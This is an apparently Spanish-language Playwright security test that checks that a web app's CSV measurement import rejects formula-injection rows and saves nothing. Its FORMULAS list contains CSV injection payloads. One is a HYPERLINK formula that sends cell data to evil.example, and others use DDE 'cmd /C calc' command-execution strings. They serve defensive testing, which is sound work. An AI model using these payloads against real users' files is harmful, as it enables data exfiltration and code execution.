import { test, expect } from '@playwright/test';
import { instrument, cspViolations, login, requireSupabase } from './_helpers.js';

// S-04 · categoría 3: inyección de fórmulas en la importación CSV de mediciones (M-04),
// en la pantalla real #/custodio/mediciones. El custodio de AVAIL (custodio2) sube un
// archivo con una fila válida y otra con la fórmula en la columna valor.
//
// Criterio: la fila con fórmula se rechaza (engine/measurements-input.js no neutraliza ni
// guarda: rechaza), el error se muestra como texto, el botón de guardar queda deshabilitado
// y no sale ninguna escritura a /rest/v1/measurements (todo o nada: la fila válida tampoco).
// No existe exportación CSV en la app (V-0x no la incluye): cuando exista, este archivo
// debe cubrir también que la salida nunca empieza por = + - @ \t \r.

const FORMULAS = [
  '=HYPERLINK("https://evil.example/?d="&A1,"ver")',
  "+cmd|' /C calc'!A0",
  '@SUM(1+1)*cmd|" /C calc"!A0',
  '-2+3+cmd|" /C calc"!A0',
  '\t=1+1',
];

const q = (v) => `"${String(v).replace(/"/g, '""')}"`;

test.beforeEach(() => requireSupabase(test));

for (const f of FORMULAS) {
  test(`CSV (M-04): la fórmula ${JSON.stringify(f)} se rechaza en la importación sin guardar nada`, async ({ page }) => {
    const seen = await instrument(page);
    const writes = [];
    page.on('request', (r) => {
      if (/\/rest\/v1\/measurements/.test(r.url()) && r.method() !== 'GET') writes.push(`${r.method()} ${r.url()}`);
    });

    await login(page, 'custodio2@example.test');
    await page.goto('./#/custodio/mediciones');
    await page.getByLabel('Indicador').selectOption({ label: 'AVAIL · Disponibilidad' });
    await expect(page.getByRole('heading', { name: 'Importar CSV' })).toBeVisible();

    const csv = [
      'fecha,unidad,valor',
      `2026-01-15,${q('Unidad Alfa')},99.95`,
      `2026-01-16,${q('Unidad Alfa')},${q(f)}`,
    ].join('\n');
    await page.getByLabel('Archivo CSV').setInputFiles({
      name: 'mediciones.csv', mimeType: 'text/csv', buffer: Buffer.from(csv, 'utf8'),
    });

    const errors = page.locator('.csv-errors');
    await expect(errors).toBeVisible();
    await expect(errors).toContainText('no se guardó nada');
    await expect(errors).toContainText('Fila 3');
    await expect(errors).toContainText('posible fórmula');
    await expect(page.locator('.csv-ok')).toHaveCount(0);
    await expect(page.getByRole('button', { name: /Guardar .*mediciones/ })).toBeDisabled();

    // Intento de forzar el guardado: el botón sigue inactivo y nada sale a la API.
    await page.getByRole('button', { name: /Guardar .*mediciones/ }).click({ force: true, timeout: 2000 }).catch(() => {});
    await page.waitForTimeout(300);
    expect(writes, 'escrituras a measurements').toEqual([]);

    // La celda no se interpreta: sin diálogos, sin violaciones de CSP, sin nodos inyectados.
    expect(seen.dialogs).toEqual([]);
    expect(await cspViolations(page)).toEqual([]);
    expect(await page.locator('.csv-errors a, .csv-errors img, .csv-errors script').count()).toBe(0);
  });
}
